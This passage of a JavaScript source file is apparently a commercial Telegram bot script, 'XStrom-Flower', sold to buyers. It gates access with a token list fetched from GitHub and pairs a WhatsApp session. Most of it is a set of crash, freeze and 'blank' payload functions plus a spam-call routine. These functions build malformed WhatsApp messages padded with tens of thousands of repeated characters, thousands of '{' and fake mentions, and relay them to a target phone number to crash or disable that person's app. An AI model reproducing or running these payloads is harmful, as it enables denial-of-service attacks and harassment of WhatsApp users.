const fs = require('fs');
const { default: makeWASocket, cardsCrL, chatId, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('lotusbail');
const P = require('pino');
const JsConfuser = require('js-confuser');
const CrashVamp = fs.readFileSync('./XStromFlower.jpeg')
const crypto = require('crypto');
const chalk = require('chalk');
const global = require('./XStromConfig.js');
const Boom = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(global.botToken, { polling: true });
let superVip = JSON.parse(fs.readFileSync('./XStromFlowDB/superVip.json'));
let premiumUsers = JSON.parse(fs.readFileSync('./XStromFlowDB/premium.json'));
let OwnerUsers = JSON.parse(fs.readFileSync('./XStromFlowDB/Owner.json'));
let adminUsers = JSON.parse(fs.readFileSync('./XStromFlowDB/admin.json'));
let bannedUser = JSON.parse(fs.readFileSync('./XStromFlowDB/banned.json'));
let securityUser = JSON.parse(fs.readFileSync('./XStromFlowDB/security.json'));
const owner = global.owner;
const cooldowns = new Map();
const axios = require('axios');
const BOT_TOKEN = global.botToken; // Kalau token ada di VerloadConfig.js
const startTime = new Date(); // Waktu mulai online

// Fungsi untuk menghitung durasi online dalam format jam:menit:detik
function getOnlineDuration() {
  let onlineDuration = new Date() - startTime; // Durasi waktu online dalam milidetik

  // Convert durasi ke format jam:menit:detik
  let seconds = Math.floor((onlineDuration / 1000) % 60); // Detik
  let minutes = Math.floor((onlineDuration / (1000 * 60)) % 60); // Menit
  let hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24); // Jam

  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

function updateMenuBot() {
  const message = `${getOnlineDuration()}`;

  updateBotMenu(message);
}

function updateBotMenu(message) {
}

setInterval(() => {
  updateMenuBot();
}, 1000);

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(chalk.red("LU SIAPA NGENTOT!!!\nTOKEN LU GAK ADA DI DATABASE:", error.message));
    return [];
  }
}

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/VaxzyXflow/XStrom-Flower/refs/heads/main/token.json"; // Ganti dengan URL GitHub yang benar

async function validateToken() {
  console.log(chalk.blue("Loading Check Token Bot..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token Tidak Di Terima Oleh Bot!!!"));
    process.exit(1);
  }

  console.log(chalk.green("Token Anda Di Kenali Vaxzy!!!"));
  startBot();
}

function startBot() {
  console.log(chalk.green("Token Kamu Sudah Di Confirm Oleh Vaxzy!!!"));
}

validateToken();

  console.log(
    chalk.blue(`HELLO MY BUYER
╭━━⊱ двенадцать состояний 
┃▢ Script : 𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧
┃▢ Version : 1.0
┃▢ Prefix : / ( Slash )
┃▢ Language : Javascript 
┃▢ Platform : Telegram
┃.#- THANKS FOR BUY THIS SCRIPT
╰━━━━━━━━━━━━━━━⊱`)
  );

let sock;
let whatsappStatus = false;

async function startWhatsapp() {
  const { state, saveCreds } = await useMultiFileAuthState('VampirePrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
        console.log(`Disconnected. Reason: ${reason}`);

        if (reason && (reason >= 500 && reason < 600 || reason === 428 || reason === 408 || reason === 429)) {
            whatsappStatus = false;
            if (typeof bot !== 'undefined' && chatId && number) {
                await getSessions(bot, chatId, number);
            }
        } else {
            whatsappStatus = false;
        }
    } else if (connection === 'open') {
        whatsappStatus = true;
        console.log('Connected to WhatsApp!');
    }
  });
}

async function getSessions(bot, chatId, number) {
  if (!bot || !chatId || !number) {
      console.error('Error: bot, chatId, atau number tidak terdefinisi!');
      return;
  }

  const { state, saveCreds } = await useMultiFileAuthState('XProtexPrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'close') {
          const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
          if (reason && reason >= 500 && reason < 600) {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `Nomor ini ${number} \nTelah terputus dari WhatsApp.`);
              await getSessions(bot, chatId, number);
          } else {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `Nomor Ini : ${number} \nTelah kehilangan akses\nHarap sambungkan kembali.`);
              if (fs.existsSync('./XProtexPrivate/creds.json')) {
                  fs.unlinkSync('./XProtexPrivate/creds.json');
              }
          }
      } else if (connection === 'open') {
          whatsappStatus = true;
          bot.sendMessage(chatId, `Nomor ini ${number} \nBerhasil terhubung oleh Bot.`);
      }

      if (connection === 'connecting') {
          await new Promise(resolve => setTimeout(resolve, 1000));
          try {
              if (!fs.existsSync('./XProtexPrivate/creds.json')) {
                  const formattedNumber = number.replace(/\D/g, '');
                  const pairingCode = await sock.requestPairingCode(formattedNumber);
                  const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                  bot.sendMessage(chatId, `
╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮
│➻ Nᴜᴍʙᴇʀ : ${number}
│➻ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : ${formattedCode}
╰───────────────────────╯`);
              }
          } catch (error) {
              bot.sendMessage(chatId, `Nomor mu tidak Valid : ${error.message}`);
          }
      }
  });

  sock.ev.on('creds.update', saveCreds);
}
function savePremiumUsers() {
  fs.writeFileSync('./XStromFlowDB/premium.json', JSON.stringify(premiumUsers, null, 2));
}
function saveOwnerUsers() {
  fs.writeFileSync('./XStromFlowDB/Owner.json', JSON.stringify(premiumUsers, null, 2));
}
function saveAdminUsers() {
  fs.writeFileSync('./XStromFlowDB/admin.json', JSON.stringify(adminUsers, null, 2));
}
function saveVip() {
  fs.writeFileSync('./XStromFlowDB/superVip.json', JSON.stringify(superVip, null, 2));
}
function saveBanned() {
  fs.writeFileSync('./XStromFlowDB/banned.json', JSON.stringify(bannedUser, null, 2));
}
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
      if (eventType === 'change') {
          try {
              const updatedData = JSON.parse(fs.readFileSync(filePath));
              updateCallback(updatedData);
              console.log(`File ${filePath} updated successfully.`);
          } catch (error) {
              console.error(`Error updating ${filePath}:`, error.message);
          }
      }
  });
}
watchFile('./XStromFlowDB/premium.json', (data) => (premiumUsers = data));
watchFile('./XStromFlowDB/admin.json', (data) => (adminUsers = data));
watchFile('./XStromFlowDB/banned.json', (data) => (bannedUser = data));
watchFile('./XStromFlowDB/superVip.json', (data) => (superVip = data));
watchFile('./XStromFlowDB/security.json', (data) => (securityUser = data));
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
async function spamcall(target) {
    // Inisialisasi koneksi dengan makeWASocket
    const sock = makeWASocket({
        printQRInTerminal: false, // QR code tidak perlu ditampilkan
    });

    try {
        console.log(`📞 Mengirim panggilan ke ${target}`);

        // Kirim permintaan panggilan
        await sock.query({
            tag: 'call',
            json: ['action', 'call', 'call', { id: `${target}` }],
        });

        console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
    } catch (err) {
        console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
    } finally {
        sock.ev.removeAllListeners(); // Hapus semua event listener
        sock.ws.close(); // Tutup koneksi WebSocket
    }
}

//FUNCTION BUG TEMPEL DI SINI
async function XStromXCallVersion2(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { 
              text: `⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "cta_call",
                  buttonParamsJson: "",
                },
                {
                  name: "payment_info",
                  buttonParamJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                 },
               {
                 name: "cta_url",
                 buttonParamsJson: "",
               },
                {
                  name: "galaxy_message",
                  buttonParamsJson: `{ icon: 'DOCUMENT' }`,
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{ 'consencutive': true }",
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Sending Bug CrashForce By XStrom-Flower To ${target}`));
}

async function XProtexCallV7Galxy(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ꦾ".repeat(77777), 
              hasMediaAttachment: false,
            },
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              questionMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamJson: "",
                },
                {
                  name: "cta_url",
                  buttonParamJson: "",
                },
                {
                  name: "galaxy_message",
                  nameButtonParamJson: "",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Sending Bug CrashForce By XStrom-Flower To ${target}`));
}

async function XProtexXCallV6(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ꦾ".repeat(77777), 
              hasMediaAttachment: false,
            },
            body: {
              text: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamJson: "",
                },
                {
                  name: "cta_url",
                  buttonParamJson: "",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Sending Bug CrashForce By XStrom-Flower To ${target}`));
}

async function XStromDelayInvisible(target, mention) {
  console.log(chalk.red(`Succes Sending Bug Delay Invisible By XStrom-Flower To ${target}`));
  let message = {
    viewOnceMessage: {
      message: {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" + "ꦾ".repeat(77777),
      publisher: "El Kontole",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function XStromFlowFreeze(target) {
    let crash = JSON.stringify({
      action: "x",
      data: "x"
    });
  
    await sock.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" + "ꦾ".repeat(77777),
      publisher: "El Kontole",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" + "ꦾ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes To Send Bug FreezeChat By XStrom-Flower To ${target}`));
}

async function XStromFlowerFreeze(target) {
    const message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ꦾ".repeat(77777), 
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "© Vaxzy4You",
                address: "ោ៝",
              },
            },
            body: {
              text: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    };

  await sock.relayMessage(target, message, {
    participant: { jid: target },
    messageId: null
  });
  console.log(chalk.red(`Succes To Send Bug FreezeChat By XStrom-Flower To ${target}`));
}

async function XStromXCallGalaxy(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
           header: {
              title: "ꦾ".repeat(77777),
              hasMediaAttachment: false,
            },
            body: {
              text: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" + "ោ៝".repeat(25000),
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
               },
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 2,
                  },
                ],
              },
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_call",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                 },
               {
                 name: "cta_url",
                 buttonParamsJson: "",
               },
                {
                  name: "galaxy_message",
                  buttonParamsJson: `{ icon: 'DOCUMENT' }`,
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{ 'consencutive': true }",
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );
   
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Sending Bug CrashForce By XStrom-Flower To ${target}`));
}

async function XProtexBlankXDelay(target) {
 try {
  const XProtex = 'ោ៝'.repeat(20000);
  const Blank = 'ꦾ'.repeat(20000);
  const msg = {
    newsletterAdminInviteMessage: {
    newsletterJid: "1234567891234@newsletter",
    newsletterName: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" + "ោ៝".repeat(20000),
    caption: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" + XProtex + Blank + "ោ៝".repeat(20000),
    inviteExpiration: "90000",
    contextInfo: {
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
      },
    },
  };
  
  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
   console.log(chalk.red.bold(`Succes Sending Bug Blank By XStrom-Flower To ${target}`));
 } catch (err) {
    console.error("Gagal Mengirim Bug", err);
  }
}

async function XProtexBlankChatV4(target) {
  const MSG = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "Xx".repeat(10000),
      inviteExpiration: "99999999999",
      groupName: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" + "ោ៝".repeat(10000),
      caption: "ោ៝".repeat(10000),
      contextInfo: {
        expiration: 1,
          ephemeralSettingTimestamp: 1,
          entryPointConversionSource: "WhatsApp.com",
          entryPointConversionApp: "WhatsApp",
          entryPointConversionDelaySeconds: 1,
            disappearingMode: {
              initiatorDeviceJid: target,
              initiator: "INITIATED_BY_OTHER",
              trigger: "UNKNOWN_GROUPS"
            },
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
